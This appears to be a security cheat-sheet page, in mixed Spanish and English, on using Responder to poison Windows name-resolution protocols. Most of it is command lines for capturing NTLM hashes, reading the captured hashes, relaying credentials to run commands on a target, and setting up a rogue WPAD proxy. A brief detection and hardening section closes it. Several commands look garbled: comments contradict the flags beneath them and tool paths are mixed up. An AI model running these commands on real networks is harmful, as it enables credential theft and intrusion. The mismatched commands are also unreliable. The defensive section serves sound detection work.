---
title: Responder
phase: tools
platform: windows, linux
tags: [responder, ntlm, relay, mitm, poisoner]
risk: critical
attack_tactic: TA0006
attack_technique: T1557
data_sources: [netbios, llmnr, mdns-traffic]
last_review: 2026-05-25
---

# Responder

### Objetivo

Envenenar protocolos de resolución de nombres (LLMNR, NBT-NS, WPAD) para capturar hashes NTLM y realizar relay de credenciales en redes Windows.

### Basic Usage

```bash
# Start Responder (defaultpoison on LLMNR, NBT-NS, MDNS)
responder -I eth0

# With fingerprinting and analysis
responder -I eth0 -f

# Passive mode (solo listening)
responder -I eth0 -r Off
```

### Hash Capturing

```bash
# Responder will poison and capture hashes when hosts query for share paths
# Check logs
cat /usr/share/responder/logs/NTLM*

# Convert hash to CrackMapExec format
python tools/ConvertHash.py
```

### NTLM Relay with MultiRelay

```bash
# Setup relay targets
python /usr/share/responder/tools/MultiRelay/ntlmrelayx.py -t target -c "whoami"

# Or start with Responder chain
responder -I eth0 --lm
```

### WPAD Proxy

```bash
# Responder acts as WPAD proxy server
# Configure browsers to connect via attacker proxy
# Capture HTTP traffic, credentials, cookies
```

### One-liners

```bash
# Turn off SMB (force Kerberos/NTLM relay)
responder -I eth0 --lm -f --wpads Off

# Specific interface
responder -I eth0

# Kill SMB server (prevent SMBhash capture and relay)
responder -I eth0 --NBTNS --WPAD --wpad-file=wpad.dat
```

### Detección y Mitigación

- **Visibilidad:** Monitor for LLMNR/NBT-NS poison events in network logs, Security Event 4672 for unusual privilege token, 4624 with weird authPackage.
- **Hardening:** Disable LLMNR via Group Policy, enable SMB signing, enforce LDAP channel binding, no WPAD deployment.

### Validación de Cobertura

- **Prueba técnica:** Run Responder in lab segment, verify logs.
- **Criterio de éxito:** Alert when LLMNR poisoning attempt detected; no valid hashes expected to be captured.
